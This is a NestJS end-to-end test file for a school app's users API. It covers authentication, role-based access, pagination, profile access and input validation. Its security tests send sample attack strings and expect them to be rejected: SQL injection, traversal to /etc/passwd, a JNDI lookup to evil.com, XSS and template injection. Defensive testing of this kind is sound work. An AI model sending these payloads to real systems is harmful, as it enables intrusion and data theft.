import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, ValidationPipe } from '@nestjs/common';
import request from 'supertest';
import { AppModule } from '../src/app.module';
import { PrismaService } from '../src/prisma/prisma.service';

// Set test environment variables
process.env.JWT_SECRET = 'test-jwt-secret-minimum-32-characters-long-12345';
process.env.JWT_REFRESH_SECRET = 'test-refresh-secret-32-characters-long-67890';
process.env.NODE_ENV = 'test';
process.env.REDIS_URL = 'redis://localhost:6379';

describe('UsersController (e2e)', () => {
    let app: INestApplication;
    let prisma: PrismaService;

    // Test data
    let adminToken: string;
    let teacherToken: string;
    let parentToken: string;
    let studentToken: string;
    let adminId: string;
    let teacherId: string;
    let parentId: string;
    let studentId: string;

    beforeAll(async () => {
        const moduleFixture: TestingModule = await Test.createTestingModule({
            imports: [AppModule],
        }).compile();

        app = moduleFixture.createNestApplication();
        app.useGlobalPipes(new ValidationPipe({ whitelist: true, transform: true }));
        await app.init();

        prisma = moduleFixture.get<PrismaService>(PrismaService);
    });

    afterAll(async () => {
        await app.close();
    });

    beforeEach(async () => {
        // Clean up test data
        await prisma.parentStudent.deleteMany({});
        await prisma.userRole.deleteMany({});
        await prisma.refreshToken.deleteMany({});
        await prisma.user.deleteMany({
            where: {
                email: { contains: 'test@' },
            },
        });

        // Create test users with different roles
        const adminResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@admin.school.com',
                password: 'Password123!',
                firstName: 'Admin',
                lastName: 'User',
                role: 'admin',
            });
        adminToken = adminResponse.body.accessToken;
        adminId = adminResponse.body.user.id;

        const teacherResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@teacher.school.com',
                password: 'Password123!',
                firstName: 'Teacher',
                lastName: 'User',
                role: 'teacher',
            });
        teacherToken = teacherResponse.body.accessToken;
        teacherId = teacherResponse.body.user.id;

        const parentResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@parent.school.com',
                password: 'Password123!',
                firstName: 'Parent',
                lastName: 'User',
                role: 'parent',
            });
        parentToken = parentResponse.body.accessToken;
        parentId = parentResponse.body.user.id;

        const studentResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@student.school.com',
                password: 'Password123!',
                firstName: 'Student',
                lastName: 'User',
                role: 'student',
            });
        studentToken = studentResponse.body.accessToken;
        studentId = studentResponse.body.user.id;
    });

    // ===============================================================================
    // AUTHENTICATION TESTS
    // ===============================================================================
    describe('Authentication', () => {
        it('should return 401 when no token provided', async () => {
            await request(app.getHttpServer())
                .get('/api/users')
                .expect(401);
        });

        it('should return 401 with invalid token format', async () => {
            await request(app.getHttpServer())
                .get('/api/users')
                .set('Authorization', 'InvalidTokenFormat')
                .expect(401);
        });

        it('should return 401 with malformed Bearer token', async () => {
            await request(app.getHttpServer())
                .get('/api/users')
                .set('Authorization', 'Bearer invalid.token.here')
                .expect(401);
        });

        it('should handle expired token gracefully', async () => {
            // Create an expired token by using a manipulated token
            const expiredToken = adminToken.slice(0, -10) + '0000000000';
            await request(app.getHttpServer())
                .get('/api/users')
                .set('Authorization', `Bearer ${expiredToken}`)
                .expect(401);
        });
    });

    // ===============================================================================
    // ROLE-BASED ACCESS TESTS
    // ===============================================================================
    describe('Role-Based Access Control', () => {
        describe('GET /api/users', () => {
            it('should allow admin to list all users', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/users')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
                expect(Array.isArray(response.body.data)).toBe(true);
            });

            it('should allow teacher to list all users', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/users')
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
                expect(Array.isArray(response.body.data)).toBe(true);
            });

            it('should block parent from listing all users', async () => {
                await request(app.getHttpServer())
                    .get('/api/users')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .expect(403);
            });

            it('should block student from listing all users', async () => {
                await request(app.getHttpServer())
                    .get('/api/users')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(403);
            });
        });

        describe('GET /api/users/role/:roleName', () => {
            it('should allow admin to filter users by role', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/users/role/student')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
                expect(Array.isArray(response.body.data)).toBe(true);
            });

            it('should allow teacher to filter users by role', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/users/role/teacher')
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
            });

            it('should block parent from filtering users by role', async () => {
                await request(app.getHttpServer())
                    .get('/api/users/role/student')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .expect(403);
            });
        });
    });

    // ===============================================================================
    // GET /api/users PAGINATION TESTS
    // ===============================================================================
    describe('GET /api/users - Pagination', () => {
        it('should return paginated results with default values', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/users')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(response.body.data).toBeDefined();
            expect(response.body.meta).toBeDefined();
            expect(response.body.meta.page).toBe(1);
            expect(response.body.meta.limit).toBeDefined();
        });

        it('should return paginated results with custom page and limit', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/users?page=1&limit=2')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(response.body.meta.page).toBe(1);
            expect(response.body.meta.limit).toBe(2);
        });

        it('should enforce maximum page size limit', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/users?page=1&limit=1000')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            // Should cap at max limit (typically 100)
            expect(response.body.meta.limit).toBeLessThanOrEqual(100);
        });

        it('should handle empty page beyond data range', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/users?page=999&limit=10')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(response.body.data).toEqual([]);
        });

        it('should reject invalid page parameter', async () => {
            await request(app.getHttpServer())
                .get('/api/users?page=invalid&limit=10')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(400);
        });

        it('should reject negative page parameter', async () => {
            await request(app.getHttpServer())
                .get('/api/users?page=-1&limit=10')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(400);
        });
    });

    // ===============================================================================
    // GET /api/users/:id TESTS
    // ===============================================================================
    describe('GET /api/users/:id', () => {
        it('should return 200 with user details for valid UUID', async () => {
            const response = await request(app.getHttpServer())
                .get(`/api/users/${studentId}`)
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(response.body.id).toBe(studentId);
            expect(response.body.email).toBeDefined();
            expect(response.body).not.toHaveProperty('passwordHash');
        });

        it('should return 404 for non-existent user UUID', async () => {
            const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
            await request(app.getHttpServer())
                .get(`/api/users/${nonExistentUuid}`)
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(404);
        });

        it('should return 400 for invalid UUID format', async () => {
            await request(app.getHttpServer())
                .get('/api/users/invalid-uuid')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(400);
        });

        it('should return 400 for SQL injection attempt in UUID', async () => {
            await request(app.getHttpServer())
                .get('/api/users/\'; DROP TABLE users; --')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(400);
        });

        it('should allow user to access own profile', async () => {
            const response = await request(app.getHttpServer())
                .get(`/api/users/${studentId}`)
                .set('Authorization', `Bearer ${studentToken}`)
                .expect(200);

            expect(response.body.id).toBe(studentId);
        });

        it('should return limited profile for related users', async () => {
            // First create parent-student relationship
            await prisma.parentStudent.create({
                data: {
                    parentId: parentId,
                    studentId: studentId,
                },
            });

            const response = await request(app.getHttpServer())
                .get(`/api/users/${studentId}`)
                .set('Authorization', `Bearer ${parentToken}`)
                .expect(200);

            expect(response.body.id).toBe(studentId);
        });

        it('should block access to unrelated user profiles', async () => {
            await request(app.getHttpServer())
                .get(`/api/users/${adminId}`)
                .set('Authorization', `Bearer ${studentToken}`)
                .expect(403);
        });
    });

    // ===============================================================================
    // GET /api/users/:id/children TESTS
    // ===============================================================================
    describe('GET /api/users/:id/children', () => {
        it('should allow parent to view own children', async () => {
            // Create parent-student relationship
            await prisma.parentStudent.create({
                data: {
                    parentId: parentId,
                    studentId: studentId,
                },
            });

            const response = await request(app.getHttpServer())
                .get(`/api/users/${parentId}/children`)
                .set('Authorization', `Bearer ${parentToken}`)
                .expect(200);

            expect(Array.isArray(response.body)).toBe(true);
        });

        it('should block parent from viewing other parents children', async () => {
            await request(app.getHttpServer())
                .get(`/api/users/${adminId}/children`)
                .set('Authorization', `Bearer ${parentToken}`)
                .expect(403);
        });

        it('should allow admin to view any parents children', async () => {
            const response = await request(app.getHttpServer())
                .get(`/api/users/${parentId}/children`)
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(Array.isArray(response.body)).toBe(true);
        });

        it('should allow teacher to view any parents children', async () => {
            const response = await request(app.getHttpServer())
                .get(`/api/users/${parentId}/children`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .expect(200);

            expect(Array.isArray(response.body)).toBe(true);
        });
    });

    // ===============================================================================
    // NOTIFICATION PREFERENCES TESTS
    // ===============================================================================
    describe('Notification Preferences', () => {
        it('should get own notification preferences', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/users/me/notifications')
                .set('Authorization', `Bearer ${studentToken}`)
                .expect(200);

            expect(response.body).toBeDefined();
        });

        it('should update own notification preferences', async () => {
            const updateDto = {
                emailNotifications: true,
                pushNotifications: false,
                messageNotifications: true,
            };

            const response = await request(app.getHttpServer())
                .put('/api/users/me/notifications')
                .set('Authorization', `Bearer ${studentToken}`)
                .send(updateDto)
                .expect(200);

            expect(response.body).toBeDefined();
        });

        it('should reject notification update with invalid types', async () => {
            const invalidDto = {
                emailNotifications: 'invalid_boolean',
            };

            await request(app.getHttpServer())
                .put('/api/users/me/notifications')
                .set('Authorization', `Bearer ${studentToken}`)
                .send(invalidDto)
                .expect(400);
        });

        it('should require authentication for notification preferences', async () => {
            await request(app.getHttpServer())
                .get('/api/users/me/notifications')
                .expect(401);
        });
    });

    // ===============================================================================
    // SECURITY TESTS
    // ===============================================================================
    describe('Security Tests', () => {
        it('should sanitize XSS in user profile fields', async () => {
            // This tests the SanitizePipe is working
            const xssPayload = '<script>alert("xss")</script>';

            const response = await request(app.getHttpServer())
                .get(`/api/users/${studentId}`)
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            // Verify response doesn't contain unsanitized script tags
            const responseBody = JSON.stringify(response.body);
            expect(responseBody).not.toContain('<script>');
        });

        it('should handle UUID injection attempts gracefully', async () => {
            const injectionAttempts = [
                "'; DROP TABLE users; --",
                "../../../../etc/passwd",
                "${jndi:ldap://evil.com}",
                "<img src=x onerror=alert(1)>",
                "${7*7}",
            ];

            for (const attempt of injectionAttempts) {
                await request(app.getHttpServer())
                    .get(`/api/users/${encodeURIComponent(attempt)}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(400);
            }
        });

        it('should handle null bytes in parameters', async () => {
            await request(app.getHttpServer())
                .get('/api/users/1234%005678')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(400);
        });

        it('should prevent information disclosure in error messages', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/users/invalid-uuid-format')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(400);

            // Error message should not expose internal details
            if (response.body.message) {
                expect(response.body.message).not.toContain('SQL');
                expect(response.body.message).not.toContain('prisma');
                expect(response.body.message).not.toContain('database');
            }
        });
    });

    // ===============================================================================
    // EDGE CASES
    // ===============================================================================
    describe('Edge Cases', () => {
        it('should handle concurrent requests gracefully', async () => {
            const promises = Array(10).fill(0).map(() =>
                request(app.getHttpServer())
                    .get('/api/users')
                    .set('Authorization', `Bearer ${adminToken}`)
            );

            const responses = await Promise.all(promises);

            // All should succeed or fail gracefully
            responses.forEach(response => {
                expect([200, 429, 401]).toContain(response.status);
            });
        });

        it('should handle very large page numbers', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/users?page=999999&limit=1')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(response.body.data).toEqual([]);
        });

        it('should handle special characters in role name parameter', async () => {
            const specialRoles = ['admin%00', 'teacher<script>', 'student OR 1=1'];

            for (const role of specialRoles) {
                const response = await request(app.getHttpServer())
                    .get(`/api/users/role/${encodeURIComponent(role)}`)
                    .set('Authorization', `Bearer ${adminToken}`);

                // Should either return empty results or handle gracefully
                expect([200, 400]).toContain(response.status);
            }
        });

        it('should handle empty query parameters', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/users?page=&limit=')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(response.body.data).toBeDefined();
        });

        it('should handle negative limit gracefully', async () => {
            await request(app.getHttpServer())
                .get('/api/users?page=1&limit=-10')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(400);
        });
    });

    // ===============================================================================
    // SOFT DELETE VERIFICATION
    // ===============================================================================
    describe('Soft Delete Behavior', () => {
        it('should not return soft-deleted users in list', async () => {
            // Soft delete a user
            await prisma.user.update({
                where: { id: studentId },
                data: { deletedAt: new Date() },
            });

            const response = await request(app.getHttpServer())
                .get('/api/users')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            const deletedUser = response.body.data.find(
                (u: any) => u.id === studentId
            );
            expect(deletedUser).toBeUndefined();
        });

        it('should return 404 for soft-deleted user by ID', async () => {
            await prisma.user.update({
                where: { id: studentId },
                data: { deletedAt: new Date() },
            });

            await request(app.getHttpServer())
                .get(`/api/users/${studentId}`)
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(404);
        });
    });
});
